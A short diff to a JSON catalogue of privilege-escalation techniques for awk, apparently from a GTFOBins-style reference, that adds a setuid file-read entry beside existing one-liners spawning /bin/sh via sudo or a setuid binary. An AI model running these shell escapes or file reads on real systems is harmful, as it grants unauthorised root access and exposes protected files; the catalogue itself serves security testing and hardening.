@@ -32,6 +32,11 @@
         "code": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
       }
     ],
+    "suid": [
+    {
+      "code": "./awk '//' \"[file]\""
+    }
+    ],
     "limited-suid": [
       {
         "code": "./awk 'BEGIN {system(\"/bin/sh\")}'"
